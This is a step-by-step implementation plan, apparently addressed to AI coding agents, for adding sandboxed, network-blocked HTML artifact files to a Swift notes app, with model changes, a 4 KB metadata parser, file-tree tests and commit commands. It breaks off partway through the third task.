# HTML Artifacts (Level 1) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship `.html` as a first-class, sandboxed, agent-generated artifact type — visible in the sidebar, rendered in a locked-down WKWebView pane with live reload, creatable/validatable via CLI and MCP, with an authoring skill and two demo artifacts.

**Architecture:** Markdown stays the only source of truth; an artifact is one self-contained `.html` file rendered through a dedicated `WKURLSchemeHandler` + `WKContentRuleList` + CSP sandbox (network-dead, single-resource, non-persistent). A new `TabKind.artifact` routes a new `ArtifactPaneView` beside the native editor. The agent surface is `bugbook artifact create|validate|list`, two MCP tools, and a `plugins/bugbook/skills/artifact` authoring skill.

**Tech Stack:** Swift 5.9 / SwiftPM, SwiftUI + WebKit (`WKWebView`, `WKURLSchemeHandler`, `WKContentRuleListStore`), XCTest, swift-argument-parser CLI, Node MCP server (`@modelcontextprotocol/sdk` + zod), Claude plugin skills.

---

## Context

`html-upgrade-plan.md` (repo root) is the approved design. Why this change: the markdown dialect already smuggles HTML in comments (`<!-- toggle -->`, parsed by a ~1,400-line custom parser); the format forces agents to flatten rich data ("Numbers only" in the wreview skill); HTML is the model's native rich format; and the WKWebView substrate already exists (`MailHTMLView`). This plan implements **Level 1 only** (static artifacts, §6 steps 1–9 of the design doc). Level 2 (query bridge) and Level 3 (mutations) are explicitly out of scope — but `ArtifactManifest` parses the L2 capability block now so the format is forward-compatible.

Hard constraints from the design doc:
- Markdown remains canonical; artifacts are regenerable projections. No dual-sourcing.
- One self-contained file per artifact. No asset folders, no multi-file artifacts.
- Treat every artifact as attacker-controlled (prompt-injected agent). Fail closed: an artifact never renders without the compiled network-block rule list.
- Artifacts are NOT: database rows, backlink/graph nodes, template/mention-picker entries, or searchable pages. `RowStore`, `IndexManager`, `BacklinkService`, pickers stay `.md`-only.

### Verified codebase facts (already confirmed against source — do not re-derive)

| Fact | Location |
|---|---|
| `TabKind` enum (no extension→kind mapper exists; kind set at tree build) | `Sources/Bugbook/Models/FileEntry.swift:3-28` |
| `allowsTabKind` — the ONLY exhaustive `TabKind` switch in the repo | `Sources/Bugbook/App/BugbookFeatureGate.swift:113-120` |
| Sidebar admission: `guard name.hasSuffix(".md") else { return .none }` | `FileSystemService.swift:804` in `markdownTreeItem` (797-832), single caller at 756 |
| Companion folder = page-only concept; `companionFolderPath` guards `.md` | `FileSystemService.swift:1914-1917`; all companion-moving callers also gate on `.md` (884-885, 997) → all are safe no-ops for `.html` |
| `duplicateFile` hardcodes ext `"md"` → `foo.html` would duplicate as `foo copy.md` | `FileSystemService.swift:976` |
| Sidebar rename hardcodes `".md"` → renaming `foo.html` would produce `name.md` | `FileTreeItemView.swift:369` |
| Sidebar `displayName` strips only `.md` | `FileTreeItemView.swift:214-219` |
| Breadcrumb display name strips only `.md` | `FileSystemService.swift:1321` |
| Pane routing if/else chain; `editorView(for:)` fallback | `ContentView.swift:2171-2207` |
| Pane loader guards (where artifacts must bypass block parsing) | `loadFileContentForPane` `ContentView.swift:3268-3277`; `loadFileContent` `ContentView.swift:4210` |
| Tab title/icon: `OpenFile.paneItemTitle/paneItemIcon` (`sf:` icon convention) | `Models/PaneContent.swift:215-250` |
| `OpenFile` custom Codable; `kind` decoded via `decodeIfPresent ?? .page` (unknown case **throws**) | `Models/OpenFile.swift:93-109` |
| Session-restore failure mode: one undecodable tab → whole layout decode fails → fresh default workspace (no crash). Same accepted risk as past case additions | `Models/WorkspaceManager.swift:631-656` |
| Kind inference for history/link paths not in tree | `AppState.resolveEntry` fallback `AppState.swift:523-532`; `ContentView.navigateToFilePath` `5755-5766` |
| `makeTab` copies `entry.kind`/`entry.icon` into OpenFile — artifacts need no extra wiring | `AppState.swift:245-261`, `cleanDisplayName` 241-243 |
| WKWebView template (`NSViewRepresentable` + coordinator) | `MailHTMLView`, `Views/Mail/MailPaneView.swift:888-941` |
| `isInspectable` house pattern: `if #available(macOS 13.3, *), AppEnvironment.isDev` | `WebKitBrowserEngine.swift:84-86` |
| **No `WKURLSchemeHandler` or `WKContentRuleList` usage exists anywhere in the repo yet** | verified by grep |
| FSEvents watcher: `WorkspaceWatcher(debounceInterval:onChange:)`, callback on main queue, FSEvents latency hardcoded `1.0` | `Services/WorkspaceWatcher.swift:1-78` |
| `updateOpenFile(tabId:persist:transform:)` for live tab chrome updates | `Models/WorkspaceManager.swift:316` |
| AI prompt line to reword | `Services/AiService.swift:67` (inside `systemInstruction`, 49-70) |
| `BugbookTests` target has `exclude: ["perf_baseline.tsv"]` and **no `resources:`** — fixture needs a `resources` declaration | `Package.swift:107-115` |
| Test conventions: XCTest, `@MainActor` classes, `makeTemporaryDirectory()` helper | `Tests/BugbookTests/FileSystemServiceTests.swift:1-28` |
| CLI: swift-argument-parser; subcommand registry; `CLIError`; `outputJSON` | `BugbookCLI.swift:10`, `Helpers.swift:5-23, 280-285` |
| MCP: SDK + zod, `run(args)` execFile wrapper, `writeTmp`/`cleanTmp`, `ok`/`fail` | `mcp-server/index.js:25-66` |
| Commit style: plain imperative sentences, no conventional-commit prefixes, **no Co-Authored-By trailer** (user rule) | `git log` |

### Key decisions (locked)

1. **`.artifact` routes via a new top-level branch in `paneContentRouting`**, placed after the `isDatabase` branch and before the `blockDocuments` meeting-page lookup — artifacts must render in both app modes (legacy routing is feature-gated) and never populate `blockDocuments`.
2. **Same scheme-handler token across live reloads; new token per pane open.** Re-tokenizing would force WKWebView teardown per agent save (flash, lost scroll). T6 (cross-artifact persistence) is unaffected: the data store is `.nonPersistent()` and pane-scoped.
3. **No companion folders for `.html` files** (`companionFolderPath` stays `.md`-gated; tests lock the no-op behavior). v1 forbids multi-file artifacts, so an artifact never owns a folder. A sibling `chart/` next to `chart.html` is an ordinary folder.
4. **No minimum-size skip for `.html`** (the `<10`-byte rule exists only for the `"# \n"` md placeholder; `artifact create` feedback loops need files visible immediately).
5. **Static sidebar icon `sf:doc.richtext` set at tree build** (no 4 KB read per tree rebuild); the manifest's `bugbook-icon` upgrades the *tab* chrome after open.
6. **In-page anchor navigation (`#fragment`) must be allowed** by the navigation policy (TOC/progressive disclosure is a stated use case) — compare URLs ignoring fragment.
7. **`<a href="https://…">` user-clickable links are legal in artifacts** (T4 confirm-sheet flow); only *resource loads* (src/srcset, `<link href>`, CSS `url()`/`@import`, meta-refresh) hard-fail CLI validation.
8. **Fail closed:** rule-list compile error → error UI, never an unprotected load.

---

## Task 1: `TabKind.artifact` + model shims + feature gate

**Files:**
- Modify: `Sources/Bugbook/Models/FileEntry.swift`
- Modify: `Sources/Bugbook/Models/OpenFile.swift`
- Modify: `Sources/Bugbook/Models/PaneContent.swift:229-233, 249`
- Modify: `Sources/Bugbook/App/BugbookFeatureGate.swift:113-120`
- Modify: `Sources/Bugbook/App/AppState.swift:241-243, 523-532`
- Create: `Tests/BugbookTests/ArtifactModelTests.swift`

- [ ] **Step 1.1: Write the failing test**

Create `Tests/BugbookTests/ArtifactModelTests.swift`:

```swift
import XCTest
@testable import Bugbook

final class ArtifactModelTests: XCTestCase {
    private func makeArtifactOpenFile(
        path: String = "/ws/Weekly Review/sleep-trends.html",
        displayName: String? = nil,
        icon: String? = nil
    ) -> OpenFile {
        OpenFile(
            id: UUID(),
            path: path,
            content: "",
            isDirty: false,
            isEmptyTab: false,
            kind: .artifact,
            displayName: displayName,
            openerPagePath: nil,
            icon: icon,
            navigationHistory: [path],
            navigationHistoryIndex: 0
        )
    }

    func testRemovingPageExtension() {
        XCTAssertEqual("sleep-trends.html".removingPageExtension, "sleep-trends")
        XCTAssertEqual("Weekly Review.md".removingPageExtension, "Weekly Review")
        XCTAssertEqual("Notes.db.md".removingPageExtension, "Notes.db")
        XCTAssertEqual("archive.tar".removingPageExtension, "archive.tar")
        XCTAssertEqual("plain".removingPageExtension, "plain")
        XCTAssertEqual("".removingPageExtension, "")
    }

    func testTabKindArtifactShims() {
        XCTAssertTrue(TabKind.artifact.isArtifact)
        XCTAssertFalse(TabKind.page.isArtifact)
        let entry = FileEntry(
            id: "/ws/chart.html", name: "chart.html", path: "/ws/chart.html",
            isDirectory: false, kind: .artifact
        )
        XCTAssertTrue(entry.isArtifact)
        XCTAssertFalse(entry.isDatabase)
    }

    func testFeatureGateAllowsArtifact() {
        // .artifact must be allowed unconditionally (both legacy and non-legacy modes).
        XCTAssertTrue(BugbookFeatureGate.allowsTabKind(.artifact))
    }

    func testOpenFileCodableRoundTripWithArtifactKind() throws {
        let file = makeArtifactOpenFile()
        let data = try JSONEncoder().encode(file)
        let decoded = try JSONDecoder().decode(OpenFile.self, from: data)
        XCTAssertEqual(decoded.kind, .artifact)
        XCTAssertTrue(decoded.isArtifact)
        XCTAssertEqual(decoded.path, file.path)
    }

    func testArtifactPaneItemTitleStripsHtmlExtension() {
        XCTAssertEqual(makeArtifactOpenFile().paneItemTitle, "sleep-trends")
        XCTAssertEqual(
            makeArtifactOpenFile(displayName: "Sleep Trends — 2026-W23").paneItemTitle,
            "Sleep Trends — 2026-W23"
        )
    }

    func testArtifactPaneItemIcon() {
        XCTAssertEqual(makeArtifactOpenFile().paneItemIcon, "sf:doc.richtext")
        XCTAssertEqual(makeArtifactOpenFile(icon: "sf:bed.double").paneItemIcon, "sf:bed.double")
    }
}
```

- [ ] **Step 1.2: Run the test to verify it fails**

Run: `swift test --filter ArtifactModelTests`
Expected: COMPILE ERROR — `type 'TabKind' has no member 'artifact'`, `value of type 'String' has no member 'removingPageExtension'`.

- [ ] **Step 1.3: Implement the model changes**

In `Sources/Bugbook/Models/FileEntry.swift` — add the case after `case databaseRow(...)` (line 14), the shim after `isDatabaseRow` (line 25), the `FileEntry` shim after line 50, and the String extension at the end of the file:

```swift
    case databaseRow(dbPath: String, rowId: String)
    /// Self-contained HTML artifact rendered in a locked-down WKWebView (Level 1).
    case artifact
```

```swift
    var isDatabaseRow: Bool { if case .databaseRow = self { return true }; return false }
    var isArtifact: Bool { self == .artifact }
```

```swift
    // in struct FileEntry, with the other forwarding shims:
    var isDatabaseRow: Bool { kind.isDatabaseRow }
    var isArtifact: Bool { kind.isArtifact }
```

```swift
// at the end of FileEntry.swift:

extension String {
    /// File name with a known document extension removed (".md" pages, ".html" artifacts).
    var removingPageExtension: String {
        if hasSuffix(".md") { return String(dropLast(3)) }
        if hasSuffix(".html") { return String(dropLast(5)) }
        return self
    }
}
```

In `Sources/Bugbook/Models/OpenFile.swift` — add alongside the other kind shims (after `isDatabaseRow`):

```swift
    var isArtifact: Bool { kind.isArtifact }
```

No Codable changes in `OpenFile` — `TabKind`'s synthesized Codable handles the new case (encodes as `{"artifact":{}}`). Old binaries reading a session containing `.artifact` fail the whole layout decode and fall back to a fresh default workspace (`WorkspaceManager.swift:654`) — accepted risk, same as past case additions.

In `Sources/Bugbook/Models/PaneContent.swift` — `paneItemTitle` (lines 229-233), replace:

```swift
        let filename = (path as NSString).lastPathComponent
        if filename.hasSuffix(".md") {
            return String(filename.dropLast(3))
        }
        return filename.isEmpty ? "Untitled" : filename
```

with:

```swift
        let trimmed = (path as NSString).lastPathComponent.removingPageExtension
        return trimmed.isEmpty ? "Untitled" : trimmed
```

`paneItemIcon` (line 249), replace `return isDatabase ? "sf:tablecells" : "sf:doc.text"` with:

```swift
        if isArtifact { return "sf:doc.richtext" }
        return isDatabase ? "sf:tablecells" : "sf:doc.text"
```

In `Sources/Bugbook/App/BugbookFeatureGate.swift:113-120`:

```swift
    static func allowsTabKind(_ kind: TabKind) -> Bool {
        switch kind {
        case .page, .database, .databaseRow, .meetings, .artifact:
            return true
        case .mail, .calendar, .browser, .graphView, .skill, .gateway, .chat:
            return legacyPanesEnabled
        }
    }
```

In `Sources/Bugbook/App/AppState.swift` — `cleanDisplayName` (241-243):

```swift
    private func cleanDisplayName(_ name: String) -> String {
        name.removingPageExtension
    }
```

and the `resolveEntry` fallback (523-532), replace `let kind: TabKind = isDatabase ? .database : .page` with:

```swift
        let kind: TabKind
        if isDatabase {
            kind = .database
        } else if path.hasSuffix(".html") {
            kind = .artifact
        } else {
            kind = .page
        }
```

- [ ] **Step 1.4: Run tests to verify they pass**

Run: `swift test --filter ArtifactModelTests`
Expected: PASS (6 tests). Then `swift build` — the exhaustive `allowsTabKind` switch is the only place the compiler forces a change; everything else uses shims.

- [ ] **Step 1.5: Commit**

```bash
git add Sources/Bugbook/Models/FileEntry.swift Sources/Bugbook/Models/OpenFile.swift Sources/Bugbook/Models/PaneContent.swift Sources/Bugbook/App/BugbookFeatureGate.swift Sources/Bugbook/App/AppState.swift Tests/BugbookTests/ArtifactModelTests.swift
git commit -m "Add TabKind.artifact with model shims and feature gate"
```

---

## Task 2: `ArtifactManifest` — bounded 4 KB metadata parser (BugbookCore)

HTML has no YAML frontmatter; artifacts declare metadata in `<meta>` tags. One shared parser for app, CLI, and (future) iOS.

**Files:**
- Create: `Sources/BugbookCore/Model/ArtifactManifest.swift`
- Create: `Tests/BugbookCoreTests/ArtifactManifestTests.swift`

- [ ] **Step 2.1: Write the failing tests**

Create `Tests/BugbookCoreTests/ArtifactManifestTests.swift`:

```swift
import XCTest
@testable import BugbookCore

final class ArtifactManifestTests: XCTestCase {
    private let happyPath = """
    <!doctype html>
    <html><head>
    <meta charset="utf-8">
    <meta name="bugbook-artifact" content="1">
    <meta name="bugbook-title" content="Sleep Trends — 2026-W23">
    <meta name="bugbook-icon" content="sf:bed.double">
    <meta name="bugbook-generator" content="claude-code/wreview">
    </head><body></body></html>
    """

    func testParsesMarkerTitleIconGenerator() {
        let manifest = ArtifactManifest.parse(happyPath)
        XCTAssertNotNil(manifest)
        XCTAssertEqual(manifest?.version, 1)
        XCTAssertEqual(manifest?.title, "Sleep Trends — 2026-W23")
        XCTAssertEqual(manifest?.icon, "sf:bed.double")
        XCTAssertEqual(manifest?.generator, "claude-code/wreview")
        XCTAssertEqual(manifest?.hasCapabilityBlock, false)
        XCTAssertNil(manifest?.capabilities)
    }

    func testReturnsNilWithoutMarker() {
        let html = #"<html><head><meta name="bugbook-title" content="X"></head></html>"#
        XCTAssertNil(ArtifactManifest.parse(html))
        XCTAssertNil(ArtifactManifest.parse(""))
    }

    func testMarkerVersionParsing() {
        XCTAssertEqual(ArtifactManifest.parse(#"<meta name="bugbook-artifact" content="2">"#)?.version, 2)
        XCTAssertEqual(ArtifactManifest.parse(#"<meta name="bugbook-artifact" content="abc">"#)?.version, 1)
    }

    func testAttributeOrderReversed() {
        let html = #"<meta name="bugbook-artifact" content="1"><meta content="Reversed" name="bugbook-title">"#
        XCTAssertEqual(ArtifactManifest.parse(html)?.title, "Reversed")
    }

    func testSingleQuotedAndCaseInsensitive() {
        let html = "<META NAME='bugbook-artifact' CONTENT='1'><meta name='bugbook-title' content='Single'>"
        let manifest = ArtifactManifest.parse(html)
        XCTAssertEqual(manifest?.version, 1)
        XCTAssertEqual(manifest?.title, "Single")
    }

    func testIgnoresTagsBeyond4KBoundary() {
        let padding = String(repeating: "<!-- padding -->", count: 300)  // 4,800 bytes
        let html = #"<meta name="bugbook-artifact" content="1">"# + padding
            + #"<meta name="bugbook-title" content="Too Late">"#
        let manifest = ArtifactManifest.parse(html)
        XCTAssertNotNil(manifest)
        XCTAssertNil(manifest?.title)

        let lateMarker = padding + #"<meta name="bugbook-artifact" content="1">"#
        XCTAssertNil(ArtifactManifest.parse(lateMarker))
    }

    func testMultiByteCharacterAtBoundaryDoesNotCrash() {
        let pad = String(repeating: "a", count: 4093)
        let html = "<!-- " + pad + "🚀 -->"  // emoji straddles byte 4096
        XCTAssertNil(ArtifactManifest.parse(html))
    }

    func testParsesCapabilityManifest() {
        let html = happyPath + """
        <script type="application/bugbook-manifest">
        { "manifestVersion": 1,
          "capabilities": { "query": ["Garmin Sleep", "Weekly Reviews"], "mutate": [] } }
        </script>
        """
        let manifest = ArtifactManifest.parse(html)
        XCTAssertEqual(manifest?.hasCapabilityBlock, true)
        XCTAssertEqual(manifest?.capabilities?.query, ["Garmin Sleep", "Weekly Reviews"])
        XCTAssertEqual(manifest?.capabilities?.mutate, [])
        XCTAssertEqual(manifest?.capabilities?.manifestVersion, 1)
    }

    func testMalformedManifestJSONIsInert() {
        let html = happyPath + #"<script type="application/bugbook-manifest">{ not json</script>"#
        let manifest = ArtifactManifest.parse(html)
        XCTAssertEqual(manifest?.hasCapabilityBlock, true)
        XCTAssertNil(manifest?.capabilities)
    }

    func testLoadReadsBoundedBytesFromDisk() throws {
        let dir = FileManager.default.temporaryDirectory
            .appendingPathComponent("ArtifactManifestTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }

        let url = dir.appendingPathComponent("big.html")
        try (happyPath + String(repeating: "x", count: 1_000_000))
            .write(to: url, atomically: true, encoding: .utf8)

        XCTAssertEqual(ArtifactManifest.load(contentsOf: url)?.title, "Sleep Trends — 2026-W23")
        XCTAssertNil(ArtifactManifest.load(contentsOf: dir.appendingPathComponent("missing.html")))
    }
}
```

- [ ] **Step 2.2: Run to verify failure**

Run: `swift test --filter ArtifactManifestTests`
Expected: COMPILE ERROR — `cannot find 'ArtifactManifest' in scope`.

- [ ] **Step 2.3: Implement the parser**

Create `Sources/BugbookCore/Model/ArtifactManifest.swift` (pure Foundation — compiles for iOS; `NSRegularExpression` matches house style):

```swift
import Foundation

/// Metadata embedded in a Bugbook HTML artifact via <meta> tags.
///
/// HTML has no YAML frontmatter, so artifacts declare metadata in the document
/// head. Parsing is a bounded scan of the first 4 KB with regular expressions —
/// deliberately not an HTML parser. Shared by the app, CLI, and iOS so all
/// surfaces agree on what makes a file an artifact.
///
///     <meta name="bugbook-artifact" content="1">
///     <meta name="bugbook-title" content="Sleep Trends — 2026-W23">
///     <meta name="bugbook-icon" content="sf:bed.double">
///     <meta name="bugbook-generator" content="claude-code/wreview">
///     <script type="application/bugbook-manifest">{ ... }</script>  <!-- L2+, inert at L1 -->
public struct ArtifactManifest: Equatable, Sendable {
    /// Only the first 4 KB of the file is scanned; tags beyond it are ignored.
    public static let scanByteLimit = 4096

    /// Format version from the `bugbook-artifact` marker (defaults to 1).
    public var version: Int
    public var title: String?
    public var icon: String?
    public var generator: String?
    /// True when an `application/bugbook-manifest` script block exists in the
    /// scanned window — present means the artifact *requests* capabilities.
    /// Level 1 treats it as inert; the native grant is the only authority.
    public var hasCapabilityBlock: Bool
    /// Parsed capability request, nil when absent or malformed.
    public var capabilities: CapabilityRequest?

    public struct CapabilityRequest: Equatable, Sendable, Decodable {
        public var manifestVersion: Int
        public var query: [String]
        public var mutate: [String]

        private enum CodingKeys: String, CodingKey {
            case manifestVersion
            case capabilities
        }

        private enum CapabilityKeys: String, CodingKey {
            case query
            case mutate
        }

        public init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: CodingKeys.self)
            manifestVersion = try container.decodeIfPresent(Int.self, forKey: .manifestVersion) ?? 1
            if let caps = try? container.nestedContainer(keyedBy: CapabilityKeys.self, forKey: .capabilities) {
                query = (try? caps.decodeIfPresent([String].self, forKey: .query)) ?? []
                mutate = (try? caps.decodeIfPresent([String].self, forKey: .mutate)) ?? []
            } else {
                query = []
                mutate = []
            }
        }
    }

    /// Parses the manifest from HTML text. Returns nil when the
    /// `bugbook-artifact` marker is absent from the first 4 KB.
    public static func parse(_ html: String) -> ArtifactManifest? {
        let head = boundedHead(of: html)
        guard let marker = metaContent(named: "bugbook-artifact", in: head) else { return nil }

        let manifestJSON = capabilityBlockJSON(in: head)
        var capabilities: CapabilityRequest?
        if let manifestJSON, let data = manifestJSON.data(using: .utf8) {
            capabilities = try? JSONDecoder().decode(CapabilityRequest.self, from: data)
        }

        return ArtifactManifest(
            version: Int(marker.trimmingCharacters(in: .whitespaces)) ?? 1,
            title: metaContent(named: "bugbook-title", in: head),
            icon: metaContent(named: "bugbook-icon", in: head),
            generator: metaContent(named: "bugbook-generator", in: head),
            hasCapabilityBlock: manifestJSON != nil,
            capabilities: capabilities
        )
    }

    /// Reads at most `scanByteLimit` bytes from disk and parses.
    /// Returns nil for unreadable files or files without the marker.
    public static func load(contentsOf url: URL) -> ArtifactManifest? {
        guard let handle = try? FileHandle(forReadingFrom: url) else { return nil }
        defer { try? handle.close() }
        guard let data = try? handle.read(upToCount: scanByteLimit), !data.isEmpty else { return nil }
        // Lossy decode: a multi-byte character truncated at the boundary becomes
        // a replacement character instead of failing the whole scan.
        return parse(String(decoding: data, as: UTF8.self))
    }

    // MARK: - Internals

    private static func boundedHead(of html: String) -> String {
        let utf8 = html.utf8
        guard utf8.count > scanByteLimit else { return html }
        return String(decoding: Array(utf8.prefix(scanByteLimit)), as: UTF8.self)
    }

    /// Extracts content for `<meta name="..." content="...">`, tolerating either
    /// attribute order, single or double quotes, and any case.
    static func metaContent(named name: String, in head: String) -> String? {
        let escaped = NSRegularExpression.escapedPattern(for: name)
        let nameFirst = "<meta\\b[^>]*?\\bname\\s*=\\s*[\"']\(escaped)[\"'][^>]*?\\bcontent\\s*=\\s*[\"']([^\"']*)[\"']"
        let contentFirst = "<meta\\b[^>]*?\\bcontent\\s*=\\s*[\"']([^\"']*)[\"'][^>]*?\\bname\\s*=\\s*[\"']\(escaped)[\"']"
        for pattern in [nameFirst, contentFirst] {
            if let value = firstCapture(pattern: pattern, in: head) {
                return value
            }
        }
        return nil
    }

    private static func capabilityBlockJSON(in head: String) -> String? {
        let pattern = "<script\\b[^>]*?\\btype\\s*=\\s*[\"']application/bugbook-manifest[\"'][^>]*>([\\s\\S]*?)</script>"
        return firstCapture(pattern: pattern, in: head)?
            .trimmingCharacters(in: .whitespacesAndNewlines)
    }

    private static func firstCapture(pattern: String, in text: String) -> String? {
        guard let regex = try? NSRegularExpression(pattern: pattern, options: [.caseInsensitive]) else { return nil }
        let range = NSRange(text.startIndex..., in: text)
        guard let match = regex.firstMatch(in: text, options: [], range: range),
              match.numberOfRanges > 1,
              let captureRange = Range(match.range(at: 1), in: text) else { return nil }
        return String(text[captureRange])
    }
}
```

- [ ] **Step 2.4: Run to verify pass**

Run: `swift test --filter ArtifactManifestTests`
Expected: PASS (10 tests).

- [ ] **Step 2.5: Commit**

```bash
git add Sources/BugbookCore/Model/ArtifactManifest.swift Tests/BugbookCoreTests/ArtifactManifestTests.swift
git commit -m "Add ArtifactManifest bounded 4KB metadata parser to BugbookCore"
```

---

## Task 3: Admit `.html` in the file tree + fix extension-hardcoded file ops

**Files:**
- Modify: `Sources/Bugbook/Services/FileSystemService.swift:756, 797-832, 976, 1321, 1914-1917`
- Modify: `Sources/Bugbook/Views/Sidebar/FileTreeItemView.swift:214-219, 363-377`
- Modify: `Sources/Bugbook/Views/ContentView.swift:3268-3277, 4210`
- Test: `Tests/BugbookTests/FileSystemServiceTests.swift` (extend the existing `@MainActor` class; reuse its `makeTemporaryDirectory()` helper)

Verified signatures: `buildFileTree(at path: String, depth: Int = 0) -> [FileEntry]` (`FileSystemService.swift:698`, nonisolated, callable from tests), `renameFile(from:to:) throws` (881), `duplicateFile(at:) throws -> String` (953), `trashFile(at path: String, workspace: String) throws` (1747).

- [ ] **Step 3.1: Write the failing tests**

Add to the class in `Tests/BugbookTests/FileSystemServiceTests.swift`:

```swift
    // MARK: - HTML artifact admission (Level 1)

    func testBuildFileTreeAdmitsHtmlAsArtifact() throws {
        let root = try makeTemporaryDirectory()
        defer { try? FileManager.default.removeItem(atPath: root) }
        try "<!doctype html><html></html>".write(
            toFile: (root as NSString).appendingPathComponent("chart.html"),
            atomically: true, encoding: .utf8)

        let tree = FileSystemService().buildFileTree(at: root)

        let entry = try XCTUnwrap(tree.first { $0.name == "chart.html" })
        XCTAssertEqual(entry.kind, .artifact)
        XCTAssertEqual(entry.icon, "sf:doc.richtext")
        XCTAssertNil(entry.children)
    }

    func testZeroByteHtmlIsAdmitted() throws {
        // The <10-byte skip is a .md placeholder heuristic only; `artifact create`
        // feedback loops need html files visible immediately (decision 4).
        let root = try makeTemporaryDirectory()
        defer { try? FileManager.default.removeItem(atPath: root) }
        FileManager.default.createFile(
            atPath: (root as NSString).appendingPathComponent("empty.html"), contents: nil)

        let tree = FileSystemService().buildFileTree(at: root)
        XCTAssertTrue(tree.contains { $0.name == "empty.html" && $0.kind == .artifact })
    }

    func testHtmlInsideCompanionFolderNestsUnderPage() throws {
        let root = try makeTemporaryDirectory()
        defer { try? FileManager.default.removeItem(atPath: root) }
        let pagePath = (root as NSString).appendingPathComponent("Weekly Review.md")
        try "# Weekly Review\n\nContent here.".write(toFile: pagePath, atomically: true, encoding: .utf8)
        let companion = (root as NSString).appendingPathComponent("Weekly Review")
        try FileManager.default.createDirectory(atPath: companion, withIntermediateDirectories: true)
        try "<!doctype html>".write(
            toFile: (companion as NSString).appendingPathComponent("sleep-trends.html"),
            atomically: true, encoding: .utf8)

        let tree = FileSystemService().buildFileTree(at: root)
        let page = try XCTUnwrap(tree.first { $0.name == "Weekly Review.md" })
        XCTAssertTrue(
            page.children?.contains { $0.name == "sleep-trends.html" && $0.kind == .artifact } ?? false,
            "page-attached artifact should nest under its page via the companion folder"
        )
    }

    func testUnderscoreArtifactsFolderHidden() throws {
        // Row-attached artifacts live in `_artifacts/`; the `_` prefix keeps them
        // out of the sidebar by existing convention (shouldShowSidebarEntry).
        let root = try makeTemporaryDirectory()
        defer { try? FileManager.default.removeItem(atPath: root) }
        let artifacts = (root as NSString).appendingPathComponent("_artifacts")
        try FileManager.default.createDirectory(atPath: artifacts, withIntermediateDirectories: true)
        try "<!doctype html>".write(
            toFile: (artifacts as NSString).appendingPathComponent("x.html"),
            atomically: true, encoding: .utf8)

        let tree = FileSystemService().buildFileTree(at: root)
        XCTAssertTrue(tree.isEmpty)
    }

    func testArtifactSiblingFolderIsNotItsCompanion() throws {
        // chart/ next to chart.html is an ordinary folder (decision 3):
        // visible in the tree, untouched by rename of the artifact.
        let root = try makeTemporaryDirectory()
        defer { try? FileManager.default.removeItem(atPath: root) }
        let chartPath = (root as NSString).appendingPathComponent("chart.html")
        try "<!doctype html>".write(toFile: chartPath, atomically: true, encoding: .utf8)
        let chartDir = (root as NSString).appendingPathComponent("chart")
        try FileManager.default.createDirectory(atPath: chartDir, withIntermediateDirectories: true)
        try "# Note\n\nlong enough".write(
            toFile: (chartDir as NSString).appendingPathComponent("note.md"),
            atomically: true, encoding: .utf8)

        let service = FileSystemService()
        let tree = service.buildFileTree(at: root)
        XCTAssertTrue(tree.contains { $0.name == "chart" && $0.isDirectory },
                      "sibling folder must stay an independent visible entry")

        let renamed = (root as NSString).appendingPathComponent("graph.html")
        try service.renameFile(from: chartPath, to: renamed)
        XCTAssertTrue(FileManager.default.fileExists(atPath: chartDir),
                      "renaming an artifact must not move the sibling folder")
        XCTAssertTrue(FileManager.default.fileExists(atPath: renamed))
    }

    func testDuplicateHtmlKeepsExtension() throws {
        let root = try makeTemporaryDirectory()
        defer { try? FileManager.default.removeItem(atPath: root) }
        let chartPath = (root as NSString).appendingPathComponent("chart.html")
        try "<!doctype html>".write(toFile: chartPath, atomically: true, encoding: .utf8)

        let newPath = try FileSystemService().duplicateFile(at: chartPath)
        XCTAssertEqual((newPath as NSString).lastPathComponent, "chart copy.html")
        XCTAssertTrue(FileManager.default.fileExists(atPath: newPath))
    }

    func testTrashHtmlMovesOnlyTheFile() throws {
        let root = try makeTemporaryDirectory()
        defer { try? FileManager.default.removeItem(atPath: root) }
        let chartPath = (root as NSString).appendingPathComponent("chart.html")
        try "<!doctype html>".write(toFile: chartPath, atomically: true, encoding: .utf8)
        let chartDir = (root as NSString).appendingPathComponent("chart")
        try FileManager.default.createDirectory(atPath: chartDir, withIntermediateDirectories: true)

        try FileSystemService().trashFile(at: chartPath, workspace: root)
        XCTAssertFalse(FileManager.default.fileExists(atPath: chartPath))
        XCTAssertTrue(FileManager.default.fileExists(atPath: chartDir),
                      "an artifact has no companion; its sibling folder must survive trash")
    }
```

- [ ] **Step 3.2: Run to verify failure**

Run: `swift test --filter FileSystemServiceTests`
Expected: FAIL — `.html` files produce no tree entries (`testBuildFileTreeAdmitsHtmlAsArtifact` etc.); `testDuplicateHtmlKeepsExtension` gets `chart copy.md`.

- [ ] **Step 3.3: Implement**

In `FileSystemService.swift` — rename `markdownTreeItem` → `documentTreeItem` (update the single caller at line 756) and replace the body (797-832) with:

```swift
    nonisolated private func documentTreeItem(
        name: String,
        path: String,
        resourceValues: URLResourceValues,
        siblings: Set<String>,
        depth: Int
    ) -> FileTreeItem {
        if name.hasSuffix(".md") {
            let isDbFile = name.hasSuffix(".db.md")
            // Skip empty .md files and the `# \n` placeholder from createNewFile.
            // Database files are kept regardless of size since they store metadata elsewhere.
            if !isDbFile, let size = resourceValues.fileSize, size < 10 {
                return .none
            }

            let companionName = String(name.dropLast(3))
            let children: [FileEntry]?
            if siblings.contains(companionName) {
                let companionPath = ((path as NSString).deletingLastPathComponent as NSString)
                    .appendingPathComponent(companionName)
                children = buildFileTree(at: companionPath, depth: depth + 1)
            } else {
                children = nil
            }

            return .file(FileEntry(
                id: path,
                name: name,
                path: path,
                isDirectory: false,
                kind: isDbFile ? .database : .page,
                icon: nil,
                children: children
            ))
        }

        if name.hasSuffix(".html") {
            // Artifacts are leaf documents: no companion-folder nesting, no
            // children, and no minimum-size heuristic (the <10-byte rule exists
            // only to hide the "# \n" placeholder createNewFile writes for pages).
            return .file(FileEntry(
                id: path,
                name: name,
                path: path,
                isDirectory: false,
                kind: .artifact,
                icon: "sf:doc.richtext",
                children: nil
            ))
        }

        return .none
    }
```

`duplicateFile` (line 976) — replace `let newFilename = uniqueFilename(in: dir, base: "\(baseName) copy", ext: "md")` with:

```swift
